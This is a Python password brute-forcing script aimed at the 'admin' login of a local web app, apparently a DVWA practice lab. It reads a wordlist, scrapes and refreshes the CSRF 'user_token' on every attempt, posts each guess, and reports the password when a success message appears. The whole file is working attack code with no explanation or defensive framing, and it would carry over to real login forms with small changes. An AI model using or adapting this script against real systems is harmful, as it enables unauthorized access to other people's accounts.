from sys import argv
import requests
from bs4 import BeautifulSoup as Soup

script, passw, success_messagee = argv
txt = open(passw)

target = 'http://localhost:10009/login.php'
cookie = {'security': 'impossible', 'PHPSESSID': 'a7cb442347e58a79c119d95e62690f5e'}
ses = requests.Session()
frontend = ses.get(target, cookies=cookie)

def checkSuccess(html):
    # Ready for search
    soup = Soup(html)
    #check success mess
    search = soup.findAll(text=success_messagee)

    if search:
        success = True
    else:
        success = False

    return success

source_code = frontend.text
soup = Soup(source_code)
print(soup)
csrf_token = soup.findAll(attrs={"name": "user_token"})[0].get('value')


print(f"Target: {target}")
print(f"CSRF Token = {csrf_token}")


with open(passw) as p:
    print('Running brute force..')
    for password in p:
        print(f'password tryed: {password}')
        password = password.strip()
        payload = {'username': 'admin', 'password': password, 'user_token': csrf_token}
        req = ses.post(target, cookies=cookie, params=payload)
        print(req)
        success = checkSuccess(req.text)

        if not success:
        # if it failed the CSRF token will be changed. Get the new one
            soup = Soup(req.text)
            csrf_token = soup.findAll(attrs={"name": "user_token"})[0].get('value')
        else:
        # Success! Show the result
            print(f"password is :{password}")
            break
     

# We failed, bummer. 
if not success:
  print ('Brute force failed. No matches found.')